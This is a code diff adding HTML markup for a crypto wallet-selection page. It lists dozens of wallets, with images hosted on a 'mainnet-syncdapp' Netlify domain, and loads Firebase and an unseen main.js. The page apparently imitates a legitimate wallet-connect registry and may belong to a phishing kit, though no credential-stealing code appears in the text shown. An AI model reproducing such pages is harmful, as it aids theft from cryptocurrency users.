+          </div>
+          <!--  -->
+          <!--  -->
+
+          <div class="wallet-item">
+            <div class="wallet-item__img">
+              <img
+                src="https://mainnet-syncdapp.netlify.app/img/tokenPocket.png"
+                alt=""
+                class="wallet-item-img"
+              />
+            </div>
+            <h5 class="head-4">TokenPocket</h5>
+          </div>
+          <!--  -->
+          <!--  -->
+
+          <div class="wallet-item">
+            <div class="wallet-item__img">
+              <img src="https://mainnet-syncdapp.netlify.app/img/walleth.png" alt="" class="wallet-item-img" />
+            </div>
+            <h5 class="head-4">Walleth</h5>
+          </div>
+          <!--  -->
+          <!--  -->
+
+          <div class="wallet-item">
+            <div class="wallet-item__img">
+              <img src="https://mainnet-syncdapp.netlify.app/img/atomic.png" alt="" class="wallet-item-img" />
+            </div>
+            <h5 class="head-4">Atomic</h5>
+          </div>
+          <!--  -->
+          <!--  -->
+
+          <div class="wallet-item">
+            <div class="wallet-item__img">
+              <img
+                src="https://mainnet-syncdapp.netlify.app/img/Authereum.png"
+                alt=""
+                class="wallet-item-img"
+              />
+            </div>
+            <h5 class="head-4">Authereum</h5>
+          </div>
+          <!--  -->
+
+          <!--  -->
+
+          <div class="wallet-item">
+            <div class="wallet-item__img">
+              <img src="https://mainnet-syncdapp.netlify.app/img/1.jfif" alt="" class="wallet-item-img" />
+            </div>
+            <h5 class="head-4">Huobi Wallet</h5>
+          </div>
+          <!--  -->
+          <!--  -->
+
+          <div class="wallet-item">
+            <div class="wallet-item__img">
+              <img src="https://mainnet-syncdapp.netlify.app/img/2.png" alt="" class="wallet-item-img" />
+            </div>
+            <h5 class="head-4">Eidoo</h5>
+          </div>
+          <!--  -->
+          <!--  -->
+
+          <div class="wallet-item">
+            <div class="wallet-item__img">
+              <img src="https://mainnet-syncdapp.netlify.app/img/3.png" alt="" class="wallet-item-img" />
+            </div>
+            <h5 class="head-4">ZelCore</h5>
+          </div>
+          <!--  -->
+          <!--  -->
+
+          <div class="wallet-item">
+            <div class="wallet-item__img">
+              <img src="https://mainnet-syncdapp.netlify.app/img/4.jfif" alt="" class="wallet-item-img" />
+            </div>
+            <h5 class="head-4">Nash</h5>
+          </div>
+          <!--  -->
+          <!--  -->
+
+          <div class="wallet-item">
+            <div class="wallet-item__img">
+              <img src="https://mainnet-syncdapp.netlify.app/img/5.jpg" alt="" class="wallet-item-img" />
+            </div>
+            <h5 class="head-4">Coinomi</h5>
+          </div>
+          <!--  -->
+          <!--  -->
+
+          <div class="wallet-item">
+            <div class="wallet-item__img">
+              <img src="https://mainnet-syncdapp.netlify.app/img/6.png" alt="" class="wallet-item-img" />
+            </div>
+            <h5 class="head-4">GridPlus</h5>
+          </div>
+          <!--  -->
+          <!--  -->
+
+          <div class="wallet-item">
+            <div class="wallet-item__img">
+              <img src="https://mainnet-syncdapp.netlify.app/img/7.png" alt="" class="wallet-item-img" />
+            </div>
+            <h5 class="head-4">CoolWallet S</h5>
+          </div>
+          <!--  -->
+          <!--  -->
+
+          <div class="wallet-item">
+            <div class="wallet-item__img">
+              <img src="https://mainnet-syncdapp.netlify.app/img/8.png" alt="" class="wallet-item-img" />
+            </div>
+            <h5 class="head-4">Alice</h5>
+          </div>
+          <!--  -->
+          <!--  -->
+
+          <div class="wallet-item">
+            <div class="wallet-item__img">
+              <img src="https://mainnet-syncdapp.netlify.app/img/9.jfif" alt="" class="wallet-item-img" />
+            </div>
+            <h5 class="head-4">AlphaWallet</h5>
+          </div>
+          <!--  -->
+          <!--  -->
+
+          <div class="wallet-item">
+            <div class="wallet-item__img">
+              <img src="https://mainnet-syncdapp.netlify.app/img/10.png" alt="" class="wallet-item-img" />
+            </div>
+            <h5 class="head-4">Tokenary</h5>
+          </div>
+          <!--  -->
+          <!--  -->
+
+          <div class="wallet-item">
+            <div class="wallet-item__img">
+              <img src="https://mainnet-syncdapp.netlify.app/img/safepal.png" alt="" class="wallet-item-img" />
+            </div>
+            <h5 class="head-4">SafePal</h5>
+          </div>
+          <!--  -->
+          <!--  -->
+
+          <div class="wallet-item">
+            <div class="wallet-item__img">
+              <img src="https://mainnet-syncdapp.netlify.app/img/12.jfif" alt="" class="wallet-item-img" />
+            </div>
+            <h5 class="head-4">Equal</h5>
+          </div>
+          <!--  -->
+          <!--  -->
+
+          <div class="wallet-item">
+            <div class="wallet-item__img">
+              <img src="https://mainnet-syncdapp.netlify.app/img/13.png" alt="" class="wallet-item-img" />
+            </div>
+            <h5 class="head-4">Infinito</h5>
+          </div>
+          <!--  -->
+          <!--  -->
+
+          <div class="wallet-item">
+            <div class="wallet-item__img">
+              <img src="https://mainnet-syncdapp.netlify.app/img/14.png" alt="" class="wallet-item-img" />
+            </div>
+            <h5 class="head-4">MathWallet</h5>
+          </div>
+          <!--  -->
+          <!--  -->
+
+          <div class="wallet-item">
+            <div class="wallet-item__img">
+              <img src="https://mainnet-syncdapp.netlify.app/img/15.png" alt="" class="wallet-item-img" />
+            </div>
+            <h5 class="head-4">MYKEY</h5>
+          </div>
+          <!--  -->
+          <!--  -->
+
+          <div class="wallet-item">
+            <div class="wallet-item__img">
+              <img src="https://mainnet-syncdapp.netlify.app/img/16.jfif" alt="" class="wallet-item-img" />
+            </div>
+            <h5 class="head-4">Spatium</h5>
+          </div>
+          <!--  -->
+          <!--  -->
+
+          <div class="wallet-item">
+            <div class="wallet-item__img">
+              <img src="https://mainnet-syncdapp.netlify.app/img/17.png" alt="" class="wallet-item-img" />
+            </div>
+            <h5 class="head-4">wallet.io</h5>
+          </div>
+          <!--  -->
+          <!--  -->
+
+          <div class="wallet-item">
+            <div class="wallet-item__img">
+              <img src="https://mainnet-syncdapp.netlify.app/img/18.png" alt="" class="wallet-item-img" />
+            </div>
+            <h5 class="head-4">Infinity Wallet</h5>
+          </div>
+          <!--  -->
+          <!--  -->
+
+          <div class="wallet-item">
+            <div class="wallet-item__img">
+              <img src="https://mainnet-syncdapp.netlify.app/img/19.png" alt="" class="wallet-item-img" />
+            </div>
+            <h5 class="head-4">Ownbit</h5>
+          </div>
+          <!--  -->
+          <!--  -->
+
+          <div class="wallet-item">
+            <div class="wallet-item__img">
+              <img src="https://mainnet-syncdapp.netlify.app/img/20.png" alt="" class="wallet-item-img" />
+            </div>
+            <h5 class="head-4">EasyPocket</h5>
+          </div>
+          <!--  -->
+          <!--  -->
+
+          <div class="wallet-item">
+            <div class="wallet-item__img">
+              <img src="https://mainnet-syncdapp.netlify.app/img/21.png" alt="" class="wallet-item-img" />
+            </div>
+            <h5 class="head-4">ONTO</h5>
+          </div>
+          <!--  -->
+          <!--  -->
+
+          <div class="wallet-item">
+            <div class="wallet-item__img">
+              <img src="https://mainnet-syncdapp.netlify.app/img/22.png" alt="" class="wallet-item-img" />
+            </div>
+            <h5 class="head-4">Bridge Wallet</h5>
+          </div>
+          <!--  -->
+          <!--  -->
+
+          <div class="wallet-item">
+            <div class="wallet-item__img">
+              <img src="https://mainnet-syncdapp.netlify.app/img/23.png" alt="" class="wallet-item-img" />
+            </div>
+            <h5 class="head-4">SparkPoint</h5>
+          </div>
+          <!--  -->
+          <!--  -->
+
+          <div class="wallet-item">
+            <div class="wallet-item__img">
+              <img src="https://mainnet-syncdapp.netlify.app/img/24.png" alt="" class="wallet-item-img" />
+            </div>
+            <h5 class="head-4">ViaWallet</h5>
+          </div>
+          <!--  -->
+          <!--  -->
+
+          <div class="wallet-item">
+            <div class="wallet-item__img">
+              <img src="https://mainnet-syncdapp.netlify.app/img/25.png" alt="" class="wallet-item-img" />
+            </div>
+            <h5 class="head-4">Coin98</h5>
+          </div>
+          <!--  -->
+          <!--  -->
+
+          <div class="wallet-item">
+            <div class="wallet-item__img">
+              <img src="https://mainnet-syncdapp.netlify.app/img/26.png" alt="" class="wallet-item-img" />
+            </div>
+            <h5 class="head-4">BitKeep</h5>
+          </div>
+          <!--  -->
+          <!--  -->
+
+          <div class="wallet-item">
+            <div class="wallet-item__img">
+              <img src="https://mainnet-syncdapp.netlify.app/img/27.png" alt="" class="wallet-item-img" />
+            </div>
+            <h5 class="head-4">Vision</h5>
+          </div>
+          <!--  -->
+          <!--  -->
+
+          <div class="wallet-item">
+            <div class="wallet-item__img">
+              <img src="https://mainnet-syncdapp.netlify.app/img/28.png" alt="" class="wallet-item-img" />
+            </div>
+            <h5 class="head-4">SWFT Wallet</h5>
+          </div>
+          <!--  -->
+
+          <!--  -->
+
+          <div class="wallet-item">
+            <div class="wallet-item__img">
+              <img src="https://mainnet-syncdapp.netlify.app/img/29.png" alt="" class="wallet-item-img" />
+            </div>
+            <h5 class="head-4">PeakDeFi Wallet</h5>
+          </div>
+          <!--  -->
+          <!--  -->
+
+          <div class="wallet-item">
+            <div class="wallet-item__img">
+              <img src="https://mainnet-syncdapp.netlify.app/img/30.png" alt="" class="wallet-item-img" />
+            </div>
+            <h5 class="head-4">XDC Wallet</h5>
+          </div>
+          <!--  -->
+          <!--  -->
+
+          <div class="wallet-item">
+            <div class="wallet-item__img">
+              <img src="https://mainnet-syncdapp.netlify.app/img/31.png" alt="" class="wallet-item-img" />
+            </div>
+            <h5 class="head-4">Unstoppable Wallet</h5>
+          </div>
+          <!--  -->
+
+          <!--  -->
+
+          <div class="wallet-item">
+            <div class="wallet-item__img">
+              <img src="https://mainnet-syncdapp.netlify.app/img/32.jpg" alt="" class="wallet-item-img" />
+            </div>
+            <h5 class="head-4">MEET.ONE</h5>
+          </div>
+          <!--  -->
+
+          <!--  -->
+
+          <div class="wallet-item">
+            <div class="wallet-item__img">
+              <img src="https://mainnet-syncdapp.netlify.app/img/33.png" alt="" class="wallet-item-img" />
+            </div>
+            <h5 class="head-4">Dok Wallet</h5>
+          </div>
+          <!--  -->
+          <!--  -->
+
+          <div class="wallet-item">
+            <div class="wallet-item__img">
+              <img src="https://mainnet-syncdapp.netlify.app/img/34.png" alt="" class="wallet-item-img" />
+            </div>
+            <h5 class="head-4">AT.Wallet</h5>
+          </div>
+          <!--  -->
+          <!--  -->
+
+          <div class="wallet-item">
+            <div class="wallet-item__img">
+              <img src="https://mainnet-syncdapp.netlify.app/img/35.png" alt="" class="wallet-item-img" />
+            </div>
+            <h5 class="head-4">MoriX Wallet</h5>
+          </div>
+          <!--  -->
+          <!--  -->
+
+          <div class="wallet-item">
+            <div class="wallet-item__img">
+              <img src="https://mainnet-syncdapp.netlify.app/img/36.png" alt="" class="wallet-item-img" />
+            </div>
+            <h5 class="head-4">Midas Wallet</h5>
+          </div>
+          <!--  -->
+
+          <!--  -->
+
+          <div class="wallet-item">
+            <div class="wallet-item__img">
+              <img src="https://mainnet-syncdapp.netlify.app/img/38.png" alt="" class="wallet-item-img" />
+            </div>
+            <h5 class="head-4">Ledger</h5>
+          </div>
+          <!--  -->
+          <!--  -->
+
+          <div class="wallet-item">
+            <div class="wallet-item__img">
+              <img src="https://mainnet-syncdapp.netlify.app/img/39.png" alt="" class="wallet-item-img" />
+            </div>
+            <h5 class="head-4">Harmony</h5>
+          </div>
+          <!--  -->
+          <!--  -->
+
+          <div class="wallet-item">
+            <div class="wallet-item__img">
+              <img src="https://mainnet-syncdapp.netlify.app/img/40.png" alt="" class="wallet-item-img" />
+            </div>
+            <h5 class="head-4">Binance Smart Chain</h5>
+          </div>
+          <!--  -->
+          <!--  -->
+
+          <div class="wallet-item">
+            <div class="wallet-item__img">
+              <img src="https://mainnet-syncdapp.netlify.app/img/41.png" alt="" class="wallet-item-img" />
+            </div>
+            <h5 class="head-4">Polkadot</h5>
+          </div>
+          <!--  -->
+          <!--  -->
+
+          <div class="wallet-item">
+            <div class="wallet-item__img">
+              <img src="https://mainnet-syncdapp.netlify.app/img/42.png" alt="" class="wallet-item-img" />
+            </div>
+            <h5 class="head-4">Solana</h5>
+          </div>
+          <!--  -->
+        </section>
+      </section>
+
+      <!-- Section 3 -->
+      <section>
+        <section class="center section-4">
+          <p class="para-2">
+            Open a pull request on <a href="#" class="link-2">Github</a> to add
+            your wallet here.
+          </p>
+          <div class="footers m-t-70px">
+            <div class="footers-item">
+              <i class="fab fa-discord tt"></i>
+              <span>Discord</span>
+            </div>
+
+            <div class="footers-item">
+              <i class="fab fa-telegram-plane tt"></i>
+              <span>Telegram</span>
+            </div>
+
+            <div class="footers-item">
+              <i class="fab fa-twitter tt"></i>
+              <span>Twitter</span>
+            </div>
+
+            <div class="footers-item">
+              <i class="fab fa-github tt"></i>
+              <span>Github</span>
+            </div>
+          </div>
+        </section>
+      </section>
+    </section>
+
+    <script src="./../js/jQuery.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/firebase/7.14.1-0/firebase.js"></script>
+    <script src="main.js"></script>
+
+
+  </body>
+</html>
+
+
+
+
+
+
